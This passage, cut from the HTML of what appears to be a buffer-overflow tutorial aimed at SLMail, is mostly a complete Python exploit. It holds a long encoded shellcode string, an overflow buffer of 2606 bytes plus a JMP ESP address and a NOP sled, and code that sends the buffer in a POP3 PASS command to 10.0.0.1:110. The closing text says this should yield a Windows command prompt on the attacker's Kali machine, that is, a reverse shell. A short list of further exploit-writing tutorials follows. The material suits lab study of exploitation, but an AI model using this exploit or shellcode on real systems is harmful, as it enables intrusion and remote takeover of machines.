class="codeLine-a3169fbc" data-key="61f055c6d0cb43d4be71b023abf4bf9d"><span data-key="1ad4686d04e74eab9a99648cd77c73fd"><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:0"><span class="prism-token token 3">s </span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:1"><span class="prism-token token 4 operator ">=</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:2"><span class="prism-token token 5"> socket</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:3"><span class="prism-token token 6 punctuation ">.</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:4"><span class="prism-token token 7">socket</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:5"><span class="prism-token token 8 punctuation ">(</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:6"><span class="prism-token token 9">socket</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:7"><span class="prism-token token 10 punctuation ">.</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:8"><span class="prism-token token 11">AF_INET</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:9"><span class="prism-token token 12 punctuation ">,</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:10"><span class="prism-token token 13"> socket</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:11"><span class="prism-token token 14 punctuation ">.</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:12"><span class="prism-token token 15">SOCK_STREAM</span></span><span data-offset-key="1ad4686d04e74eab9a99648cd77c73fd:13"><span class="prism-token token 16 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="8f293af265ec4645a506243ef64892da"><span data-key="00942a4a44e0494eae22e3370d1e8cf5"><span data-offset-key="00942a4a44e0494eae22e3370d1e8cf5:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="92fdf2fd4f544d46af1dbcc6fe9cb8a8"><span data-key="6e71964323194ba8b6b09c603ff44ca5"><span data-offset-key="6e71964323194ba8b6b09c603ff44ca5:0"><span class="prism-token token 17">shellcode </span></span><span data-offset-key="6e71964323194ba8b6b09c603ff44ca5:1"><span class="prism-token token 18 operator ">=</span></span><span data-offset-key="6e71964323194ba8b6b09c603ff44ca5:2"><span class="prism-token token 19"> </span></span><span data-offset-key="6e71964323194ba8b6b09c603ff44ca5:3"><span class="prism-token token 20 punctuation ">(</span></span><span data-offset-key="6e71964323194ba8b6b09c603ff44ca5:4"><span class="prism-token token 21 string ">&quot;\xdb\xde\xb8\x85\x0f\xbe\x9d\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="3dbc0926bab940d697fdf59a750596b4"><span data-key="47d2067911ce4a1d9bb08e8fab778998"><span data-offset-key="47d2067911ce4a1d9bb08e8fab778998:0"><span class="prism-token token 23 string ">&quot;\x52\x31\x42\x17\x83\xea\xfc\x03\xc7\x1c\x5c\x68\x3b\xca\x22&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="92fa81f8de1346b38e3953e4df31c5f4"><span data-key="3dcc90fce4b9470ba35ad6e9221a6535"><span data-offset-key="3dcc90fce4b9470ba35ad6e9221a6535:0"><span class="prism-token token 25 string ">&quot;\x93\xc3\x0b\x43\x1d\x26\x3a\x43\x79\x23\x6d\x73\x09\x61\x82&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="7291680558de42348bb01528451d0728"><span data-key="324850a123e4465cbe9ae3f1d4c52076"><span data-offset-key="324850a123e4465cbe9ae3f1d4c52076:0"><span class="prism-token token 27 string ">&quot;\xf8\x5f\x91\x11\x8c\x77\x96\x92\x3b\xae\x99\x23\x17\x92\xb8&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="5706325eb7ce4344ac364b01c87b45d7"><span data-key="43e9df3b60a144ff8a5feb68b57b3579"><span data-offset-key="43e9df3b60a144ff8a5feb68b57b3579:0"><span class="prism-token token 29 string ">&quot;\xa7\x6a\xc7\x1a\x99\xa4\x1a\x5b\xde\xd9\xd7\x09\xb7\x96\x4a&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="96b5ab10de194b69add50731c79564be"><span data-key="7d6237bea97c4ce5b475a8da5d03c971"><span data-offset-key="7d6237bea97c4ce5b475a8da5d03c971:0"><span class="prism-token token 31 string ">&quot;\xbd\xbc\xe3\x56\x36\x8e\xe2\xde\xab\x47\x04\xce\x7a\xd3\x5f&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="8125575aa29a41718ee778201a1e0fe5"><span data-key="6c489646fec048fcba05e310d1e98157"><span data-offset-key="6c489646fec048fcba05e310d1e98157:0"><span class="prism-token token 33 string ">&quot;\xd0\x7d\x30\xd4\x59\x65\x55\xd1\x10\x1e\xad\xad\xa2\xf6\xff&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="232ee019847b426f8aa106f5979e74fe"><span data-key="b7b16129093d453eaa53dc093cd06096"><span data-offset-key="b7b16129093d453eaa53dc093cd06096:0"><span class="prism-token token 35 string ">&quot;\x4e\x08\x37\x30\xbd\x50\x70\xf7\x5e\x27\x88\x0b\xe2\x30\x4f&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="83b7ead7ae4042b59fb35400295f8c76"><span data-key="8ffc269f7e2e407eb8b5ed17a797afd5"><span data-offset-key="8ffc269f7e2e407eb8b5ed17a797afd5:0"><span class="prism-token token 37 string ">&quot;\x71\x38\xb4\x4b\xd1\xcb\x6e\xb7\xe3\x18\xe8\x3c\xef\xd5\x7e&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="f83335713d25416698a6ba5c2137db54"><span data-key="d1ede91b8d0742a1b0b34662722ee767"><span data-offset-key="d1ede91b8d0742a1b0b34662722ee767:0"><span class="prism-token token 39 string ">&quot;\x1a\xec\xe8\x53\x11\x08\x60\x52\xf5\x98\x32\x71\xd1\xc1\xe1&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="fe5e7084b65449a28dca622925114d1c"><span data-key="98db3f79139944c38121ef9577679d34"><span data-offset-key="98db3f79139944c38121ef9577679d34:0"><span class="prism-token token 41 string ">&quot;\x18\x40\xac\x44\x24\x92\x0f\x38\x80\xd9\xa2\x2d\xb9\x80\xaa&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="3871c8ac03f94cacabdc54cbbceebf28"><span data-key="35282edb7e9b43b88a25bb248fc32859"><span data-offset-key="35282edb7e9b43b88a25bb248fc32859:0"><span class="prism-token token 43 string ">&quot;\x82\xf0\x3a\x2b\x8d\x83\x49\x19\x12\x38\xc5\x11\xdb\xe6\x12&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="4a67f14937304cad8950a51d8a551d65"><span data-key="39662a2336e44982b34c7b0d2ee1be6a"><span data-offset-key="39662a2336e44982b34c7b0d2ee1be6a:0"><span class="prism-token token 45 string ">&quot;\x55\xf6\x5f\x8c\xa8\xf9\x9f\x85\x6e\xad\xcf\xbd\x47\xce\x9b&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="f49a838b01544f0599bcbec0094bc45d"><span data-key="87102a41f9ea4bfbb5f187e01b8c6038"><span data-offset-key="87102a41f9ea4bfbb5f187e01b8c6038:0"><span class="prism-token token 47 string ">&quot;\x3d\x67\x1b\x0b\x6d\xc7\xf4\xec\xdd\xa7\xa4\x84\x37\x28\x9a&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="3d35547dc8b94013a23651c7e905fe49"><span data-key="8973b7c31ed946c98fdb6b1574b41eb3"><span data-offset-key="8973b7c31ed946c98fdb6b1574b41eb3:0"><span class="prism-token token 49 string ">&quot;\xb5\x38\xe2\xb3\x5c\xc3\x65\xb6\xab\xcb\x27\xae\xa9\xcb\xc6&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="4c70ed501c12493ab855147dc4473968"><span data-key="621039b5e14f4697a94dad5b96a7deec"><span data-offset-key="621039b5e14f4697a94dad5b96a7deec:0"><span class="prism-token token 51 string ">&quot;\x95\x27\x2d\xa2\xf9\x61\xe6\x5b\x63\x28\x7c\xfd\x6c\xe6\xf9&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="4acdec034cf648e3aff0ecfacb0bfe36"><span data-key="6bc43ee1c5a84251bdbfc8579bd8525f"><span data-offset-key="6bc43ee1c5a84251bdbfc8579bd8525f:0"><span class="prism-token token 53 string ">&quot;\x3d\xe6\x05\xfe\xf0\x0f\x63\xec\x65\xe0\x3e\x4e\x23\xff\x94&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="bf8fa12a75934ddfb518b7e6ef2828fc"><span data-key="37ebd3500dae498381b664790d82b139"><span data-offset-key="37ebd3500dae498381b664790d82b139:0"><span class="prism-token token 55 string ">&quot;\xe6\xaf\x92\x72\xf6\xa6\x8e\x2c\xa1\xef\x61\x25\x27\x02\xdb&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="8295d85b09dd4f58b36765e89ae5c2b1"><span data-key="b865733255294c2885bd9f871fcaedf0"><span data-offset-key="b865733255294c2885bd9f871fcaedf0:0"><span class="prism-token token 57 string ">&quot;\x9f\x55\xdf\xbd\xd8\xdd\x04\x7e\xe6\xdc\xc9\x3a\xcc\xce\x17&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="f8cef086af384c5cacd991fa856cba4c"><span data-key="07ec27c858fe4d1688617ad2a38d939f"><span data-offset-key="07ec27c858fe4d1688617ad2a38d939f:0"><span class="prism-token token 59 string ">&quot;\xc2\x48\xba\xc7\x95\x06\x14\xae\x4f\xe9\xce\x78\x23\xa3\x86&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="d8e3671a327c48d79b6220e27e67f01d"><span data-key="df88b24ca22c460a9e71fbeb01704a92"><span data-offset-key="df88b24ca22c460a9e71fbeb01704a92:0"><span class="prism-token token 61 string ">&quot;\xfd\x0f\x74\xd0\x01\x5a\x02\x3c\xb3\x33\x53\x43\x7c\xd4\x53&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="19b3ee7bdfa34727a9587d9c2704174a"><span data-key="83a141758a174110aeffb5cfa7e2bcaf"><span data-offset-key="83a141758a174110aeffb5cfa7e2bcaf:0"><span class="prism-token token 63 string ">&quot;\x3c\x60\x44\x9b\x97\x20\x74\xd6\xb5\x01\x1d\xbf\x2c\x10\x40&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="8fbe803563aa4716bcb73884cff21983"><span data-key="924cd625bf1c40388c261a591a28ccbc"><span data-offset-key="924cd625bf1c40388c261a591a28ccbc:0"><span class="prism-token token 65 string ">&quot;\x40\x9b\x57\x7d\xc3\x29\x28\x7a\xdb\x58\x2d\xc6\x5b\xb1\x5f&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="51f8883ed5124b60be50184972814d75"><span data-key="23cf8730ddc6491782a8fe8b7c2cc3fc"><span data-offset-key="23cf8730ddc6491782a8fe8b7c2cc3fc:0"><span class="prism-token token 67 string ">&quot;\x57\x0e\xb5\xcc\x58\x1b&quot;</span></span><span data-offset-key="23cf8730ddc6491782a8fe8b7c2cc3fc:1"><span class="prism-token token 68 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="73ba51dea16246129cb27389fbc30246"><span data-key="f2266048dede4b06891421e7f908e246"><span data-offset-key="f2266048dede4b06891421e7f908e246:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="5691de0f3e084764bab9c8b860ce2284"><span data-key="ef445d296a6f4eff8b603845bc943e9f"><span data-offset-key="ef445d296a6f4eff8b603845bc943e9f:0"><span class="prism-token token 70 comment "># Exploit string: 2606 As + JMP ESP memory address + nops + shellcode</span></span></span></div><div class="codeLine-a3169fbc" data-key="edc7a1ba4aaa40edb1746ebd56008ded"><span data-key="610127f58ee645759f3fa13f50a9fd0a"><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:0"><span class="prism-token token 72 builtin ">buffer</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:1"><span class="prism-token token 73 operator ">=</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:2"><span class="prism-token token 74 string ">&quot;A&quot;</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:3"><span class="prism-token token 75"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:4"><span class="prism-token token 76 operator ">*</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:5"><span class="prism-token token 77"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:6"><span class="prism-token token 78 number ">2606</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:7"><span class="prism-token token 79"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:8"><span class="prism-token token 80 operator ">+</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:9"><span class="prism-token token 81"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:10"><span class="prism-token token 82 string ">&quot;\x8f\x35\x4a\x5f&quot;</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:11"><span class="prism-token token 83"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:12"><span class="prism-token token 84 operator ">+</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:13"><span class="prism-token token 85"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:14"><span class="prism-token token 86 string ">&quot;\x90&quot;</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:15"><span class="prism-token token 87"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:16"><span class="prism-token token 88 operator ">*</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:17"><span class="prism-token token 89"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:18"><span class="prism-token token 90 number ">16</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:19"><span class="prism-token token 91"> </span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:20"><span class="prism-token token 92 operator ">+</span></span><span data-offset-key="610127f58ee645759f3fa13f50a9fd0a:21"><span class="prism-token token 93"> shellcode</span></span></span></div><div class="codeLine-a3169fbc" data-key="a0894c284c464d969bb8b2159f6c2702"><span data-key="1c1a3cf6d0de435db1367d442ccf29f6"><span data-offset-key="1c1a3cf6d0de435db1367d442ccf29f6:0"><span class="prism-token token 94 keyword ">try</span></span><span data-offset-key="1c1a3cf6d0de435db1367d442ccf29f6:1"><span class="prism-token token 95 punctuation ">:</span></span><span data-offset-key="1c1a3cf6d0de435db1367d442ccf29f6:2"><span class="prism-token token 96"> </span></span></span></div><div class="codeLine-a3169fbc" data-key="e899e03478884d34b3b0d963f865b378"><span data-key="693ba28977d74575afc80044aac560c3"><span data-offset-key="693ba28977d74575afc80044aac560c3:0"><span class="prism-token token 96">	</span></span><span data-offset-key="693ba28977d74575afc80044aac560c3:1"><span class="prism-token token 97 keyword ">print</span></span><span data-offset-key="693ba28977d74575afc80044aac560c3:2"><span class="prism-token token 98"> </span></span><span data-offset-key="693ba28977d74575afc80044aac560c3:3"><span class="prism-token token 99 string ">&quot;\nSending buffer...&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="4af1b280951343f0b8b963f4c00e1651"><span data-key="9908f496fbef492fbb558ac9268002ad"><span data-offset-key="9908f496fbef492fbb558ac9268002ad:0"><span class="prism-token token 101 comment "># Connect to Windows 7 machine</span></span></span></div><div class="codeLine-a3169fbc" data-key="66bd6919acf64d28b3f6f53a59e5cdf6"><span data-key="ce10307e9c004ca3816d3b257708b63c"><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:0"><span class="prism-token token 102">	s</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:1"><span class="prism-token token 103 punctuation ">.</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:2"><span class="prism-token token 104">connect</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:3"><span class="prism-token token 105 punctuation ">(</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:4"><span class="prism-token token 106 punctuation ">(</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:5"><span class="prism-token token 107 string ">&#x27;10.0.0.1&#x27;</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:6"><span class="prism-token token 108 punctuation ">,</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:7"><span class="prism-token token 109 number ">110</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:8"><span class="prism-token token 110 punctuation ">)</span></span><span data-offset-key="ce10307e9c004ca3816d3b257708b63c:9"><span class="prism-token token 111 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="90757cf0e7f74b7990529ccaed2ce019"><span data-key="7f51b6f84fdf4a33a6f4b4ae15c7d717"><span data-offset-key="7f51b6f84fdf4a33a6f4b4ae15c7d717:0"><span class="prism-token token 112">	data </span></span><span data-offset-key="7f51b6f84fdf4a33a6f4b4ae15c7d717:1"><span class="prism-token token 113 operator ">=</span></span><span data-offset-key="7f51b6f84fdf4a33a6f4b4ae15c7d717:2"><span class="prism-token token 114"> s</span></span><span data-offset-key="7f51b6f84fdf4a33a6f4b4ae15c7d717:3"><span class="prism-token token 115 punctuation ">.</span></span><span data-offset-key="7f51b6f84fdf4a33a6f4b4ae15c7d717:4"><span class="prism-token token 116">recv</span></span><span data-offset-key="7f51b6f84fdf4a33a6f4b4ae15c7d717:5"><span class="prism-token token 117 punctuation ">(</span></span><span data-offset-key="7f51b6f84fdf4a33a6f4b4ae15c7d717:6"><span class="prism-token token 118 number ">1024</span></span><span data-offset-key="7f51b6f84fdf4a33a6f4b4ae15c7d717:7"><span class="prism-token token 119 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="9fab245f8273471ea1210c62ab71dfc6"><span data-key="7ff68f3a3fa645ad893b0e7b94c41921"><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:0"><span class="prism-token token 120">	s</span></span><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:1"><span class="prism-token token 121 punctuation ">.</span></span><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:2"><span class="prism-token token 122">send</span></span><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:3"><span class="prism-token token 123 punctuation ">(</span></span><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:4"><span class="prism-token token 124 string ">&#x27;USER username&#x27;</span></span><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:5"><span class="prism-token token 125 operator ">+</span></span><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:6"><span class="prism-token token 126"> </span></span><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:7"><span class="prism-token token 127 string ">&#x27;\r\n&#x27;</span></span><span data-offset-key="7ff68f3a3fa645ad893b0e7b94c41921:8"><span class="prism-token token 128 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="04077155c3eb452c8aea8d82039acfb9"><span data-key="4cc51e9cb7564b86b0f1cc4dc1c3878d"><span data-offset-key="4cc51e9cb7564b86b0f1cc4dc1c3878d:0"><span class="prism-token token 129">	data </span></span><span data-offset-key="4cc51e9cb7564b86b0f1cc4dc1c3878d:1"><span class="prism-token token 130 operator ">=</span></span><span data-offset-key="4cc51e9cb7564b86b0f1cc4dc1c3878d:2"><span class="prism-token token 131"> s</span></span><span data-offset-key="4cc51e9cb7564b86b0f1cc4dc1c3878d:3"><span class="prism-token token 132 punctuation ">.</span></span><span data-offset-key="4cc51e9cb7564b86b0f1cc4dc1c3878d:4"><span class="prism-token token 133">recv</span></span><span data-offset-key="4cc51e9cb7564b86b0f1cc4dc1c3878d:5"><span class="prism-token token 134 punctuation ">(</span></span><span data-offset-key="4cc51e9cb7564b86b0f1cc4dc1c3878d:6"><span class="prism-token token 135 number ">1024</span></span><span data-offset-key="4cc51e9cb7564b86b0f1cc4dc1c3878d:7"><span class="prism-token token 136 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="77fbe2bc535742f8b1f5d1d2d9c9c11b"><span data-key="ce39f2facb204ac083db46c5c4186caf"><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:0"><span class="prism-token token 137">	s</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:1"><span class="prism-token token 138 punctuation ">.</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:2"><span class="prism-token token 139">send</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:3"><span class="prism-token token 140 punctuation ">(</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:4"><span class="prism-token token 141 string ">&#x27;PASS &#x27;</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:5"><span class="prism-token token 142"> </span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:6"><span class="prism-token token 143 operator ">+</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:7"><span class="prism-token token 144"> </span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:8"><span class="prism-token token 145 builtin ">buffer</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:9"><span class="prism-token token 146"> </span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:10"><span class="prism-token token 147 operator ">+</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:11"><span class="prism-token token 148"> </span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:12"><span class="prism-token token 149 string ">&#x27;\r\n&#x27;</span></span><span data-offset-key="ce39f2facb204ac083db46c5c4186caf:13"><span class="prism-token token 150 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="ee18050aa6cd46c78123bae328dd0b7e"><span data-key="8807895c2b2a4f74acc0874a7ee43045"><span data-offset-key="8807895c2b2a4f74acc0874a7ee43045:0"><span class="prism-token token 151">	s</span></span><span data-offset-key="8807895c2b2a4f74acc0874a7ee43045:1"><span class="prism-token token 152 punctuation ">.</span></span><span data-offset-key="8807895c2b2a4f74acc0874a7ee43045:2"><span class="prism-token token 153">close</span></span><span data-offset-key="8807895c2b2a4f74acc0874a7ee43045:3"><span class="prism-token token 154 punctuation ">(</span></span><span data-offset-key="8807895c2b2a4f74acc0874a7ee43045:4"><span class="prism-token token 155 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="3f43b5d02934419fa0ec8ebcc32593db"><span data-key="aa9e7a2dd82c4ba382c264eb0749bdbf"><span data-offset-key="aa9e7a2dd82c4ba382c264eb0749bdbf:0"><span class="prism-token token 156">	</span></span><span data-offset-key="aa9e7a2dd82c4ba382c264eb0749bdbf:1"><span class="prism-token token 157 keyword ">print</span></span><span data-offset-key="aa9e7a2dd82c4ba382c264eb0749bdbf:2"><span class="prism-token token 158"> </span></span><span data-offset-key="aa9e7a2dd82c4ba382c264eb0749bdbf:3"><span class="prism-token token 159 string ">&quot;\ Done.&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="67cbfee7f6b845dd8e205ca2e9646332"><span data-key="76edc86bd04e4cf48c406ea301fa0336"><span data-offset-key="76edc86bd04e4cf48c406ea301fa0336:0"><span class="prism-token token 161 keyword ">except</span></span><span data-offset-key="76edc86bd04e4cf48c406ea301fa0336:1"><span class="prism-token token 162 punctuation ">:</span></span></span></div><div class="codeLine-a3169fbc" data-key="e7eb38cf19434ce49d69edd7766d6e8b"><span data-key="084c52fdafa44794bc4daf8b4b81a486"><span data-offset-key="084c52fdafa44794bc4daf8b4b81a486:0"><span class="prism-token token 163">	</span></span><span data-offset-key="084c52fdafa44794bc4daf8b4b81a486:1"><span class="prism-token token 164 keyword ">print</span></span><span data-offset-key="084c52fdafa44794bc4daf8b4b81a486:2"><span class="prism-token token 165"> </span></span><span data-offset-key="084c52fdafa44794bc4daf8b4b81a486:3"><span class="prism-token token 166 string ">&quot;Could not connect!&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="e2f7a0a9b6f043b9882b0c54f0dfe8c7"><span data-key="a1ddcb171005454183ffba0b3d7d89f3"><span data-offset-key="a1ddcb171005454183ffba0b3d7d89f3:0"><span data-slate-zero-width="n">​</span></span></span></div></pre></div><p class="blockParagraph-544a408c" data-key="9298e35c407246cd9e92af195937896a"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="144e255463e14bcfb46e164d9f323907"><span data-offset-key="144e255463e14bcfb46e164d9f323907:0">If all goes well, you should get a Windows command prompt on your Kali machine. Assembling the exploit was the easiest part for me. If it doesn&#x27;t work you, go for a 15-minute walk, cry for a bit, then check your code. It&#x27;s just a typo somewhere.</span></span></span></p><h2 id="further-reading" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="d4692aa94d8947ca912e34eebd0ae053"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="f303d87fc4a6486586499d778b74d530"><span data-offset-key="f303d87fc4a6486586499d778b74d530:0">Further reading</span></span></span><a href="#further-reading" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><ul class="list-20526648" data-key="7322a7a0ef2e485c9354c08375566a79"><li class=""><div data-key="b02184ad09624d5ebab78c7b9a9da8c8" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="cd4b79e9cfbf463e9ceb68de5856648f"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="1d18a5aac4ec40749103e4b17b59329c"><span data-offset-key="1d18a5aac4ec40749103e4b17b59329c:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="http://www.primalsecurity.net/0x7-exploit-tutorial-bad-character-analysis/" target="_blank" rel="noopener noreferrer" data-key="cbbedf2e47084d11ac3c35dc91912131"><span data-key="365aae984e8d411fa202f26a2331cd04"><span data-offset-key="365aae984e8d411fa202f26a2331cd04:0">0x7 Exploit Tutorial: Bad Character Analysis</span></span></a><span data-key="e355f2c9744a467e87343807e1d2ca94"><span data-offset-key="e355f2c9744a467e87343807e1d2ca94:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li><li class=""><div data-key="7a87eb195bf04311aef8f964bad264f9" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="1d928d1708b44dd8afea395442de6f84"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="79eec3ca008849cb89386660c2b88dcb"><span data-offset-key="79eec3ca008849cb89386660c2b88dcb:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://www.hugohirsh.com/?p=509" target="_blank" rel="noopener noreferrer" data-key="e5d0efd09b4642b49a87e4a0c363f97d"><span data-key="f279fb1942b044639e8d286cdc3b7580"><span data-offset-key="f279fb1942b044639e8d286cdc3b7580:0">Buffer Overflows - an introduction with SLMail</span></span></a><span data-key="b4f89e613247491cb6547937cf356e94"><span data-offset-key="b4f89e613247491cb6547937cf356e94:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li><li class=""><div data-key="d4425f76dfad468a9c71258ef6caf625" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="cfe60ce35a61421db7351a1ac000d8e1"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="4512fef72fd2470a9290ed32f2a4036b"><span data-offset-key="4512fef72fd2470a9290ed32f2a4036b:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener noreferrer" data-key="f706a8e05cd04b10bac7081c5c0919d1"><span data-key="c1373040d9dc4087aa1fb0b79f58cf49"><span data-offset-key="c1373040d9dc4087aa1fb0b79f58cf49:0">Exploit writing tutorial part 1 - stack based overflows</span></span></a><span data-key="6fab2867822744138e2fc327462cfa64"><span data-offset-key="6fab2867822744138e2fc327462cfa64:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li><li class=""><div data-key="6d8f96ee0bdb4cd4a5014d29c6b83118" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="050b41da6cf14d8babc927f9efa84720"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="c91375d6a0ea477bbff483ffa8b8e93d"><span data-offset-key="c91375d6a0ea477bbff483ffa8b8e93d:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://wmsmartt.wordpress.com/2011/11/25/ability-ftp-2-34-stack-based-buffer-overflow/" target="_blank" rel="noopener noreferrer" 